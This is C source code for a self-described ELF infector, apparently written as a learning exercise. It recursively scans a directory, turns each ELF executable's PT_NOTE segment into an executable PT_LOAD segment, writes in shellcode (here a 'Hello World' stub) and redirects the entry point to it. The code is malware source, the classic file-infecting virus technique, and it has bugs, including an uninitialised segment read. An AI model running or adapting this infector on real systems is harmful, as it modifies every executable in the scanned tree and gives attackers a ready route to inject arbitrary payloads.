#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <elf.h>
#include <string.h>
#include <dirent.h>
#include <ftw.h>

unsigned char shellcode[] = \
"\xeb\x17\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x59\x31\xd2\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0a\xE9\x9A\x1E\x06\x00";

int checkifElf(Elf64_Ehdr elfHeader){
    unsigned char *fileMagicNumbers = elfHeader.e_ident;

    if(fileMagicNumbers[1] == 'E' && fileMagicNumbers[2] == 'L' && fileMagicNumbers[3] == 'F'){
        return 0;
    }

    return 1;
}

int walkDirectory(const char *filename, const struct stat *statptr, int fileflags){
    FILE *filePointer;
    Elf64_Ehdr elfHeader;
    int result;
    long unsigned int originalEntryPoint;

    filePointer = fopen(filename, "rb");
    fread(&elfHeader, sizeof(elfHeader), 1, filePointer);
    result = checkifElf(elfHeader);
    if(result == 0 && strstr(filename, "geass") == NULL){
        printf("[*] %s is an Executable ELF file!\n", filename);
        printf("\tEntry Point: 0x%lx\n", elfHeader.e_entry);

        originalEntryPoint = elfHeader.e_entry;

        Elf64_Phdr elfSegment;
        int segmentCount = 0;
        while(elfSegment.p_type != 4){
            fread(&elfSegment, sizeof(elfSegment), 1, filePointer);
            segmentCount += 1;
        }

        fclose(filePointer);

        filePointer = fopen(filename, "r+b");
        
        int bytePosition = sizeof(Elf64_Ehdr) + (segmentCount - 1)*sizeof(Elf64_Phdr);
        
        fseek(filePointer, bytePosition, SEEK_SET);
        
        //note really study whats going on in here
        elfSegment.p_type = 1;
        printf("\tPT_NOTE segment Updated to PT_LOAD segment\n");
        elfSegment.p_flags = PF_R | PF_W | PF_X;
        printf("\tMade PT_LOAD segment executable\n");
        elfSegment.p_filesz += strlen(shellcode);
        printf("\tUpdated filesize for code cave\n");
        elfSegment.p_memsz += strlen(shellcode);
        printf("\tUpdated memorysize for code cave\n");
        elfSegment.p_vaddr = 0xc000000 + strlen(shellcode);
        elfSegment.p_offset = strlen(shellcode);
        printf("\tUpdated entrypoint to go to injected shellcode\n");

        fwrite(&elfSegment, sizeof(elfSegment), 1, filePointer);
        
        fseek(filePointer, elfSegment.p_vaddr, SEEK_SET);
        fwrite(shellcode, sizeof(shellcode), 1, filePointer);

        /*
        TODO ideas
        1. Read and figure out how an executable runs and is loaded
        2. study what the above code is doing by modifiying those particular headers
        3. Double check the shellcode
        4. understand the gdb stack trace and whats going on there
        */

        elfHeader.e_entry = 0xc000000;
        fseek(filePointer, 0, SEEK_SET);
        fwrite(&elfHeader, sizeof(Elf64_Ehdr), 1, filePointer);
        
        fclose(filePointer);

    }

    return 0;
}

int main(int argc, char *argv[]){
    char directoryName[strlen(argv[1])];
    int result;

    //verify argc is two
    memcpy(directoryName, argv[1], strlen(argv[1]));
    printf("[*] Scanning Directory: %s\n", directoryName);

    result = ftw(directoryName, walkDirectory, 2);

    return 0;
}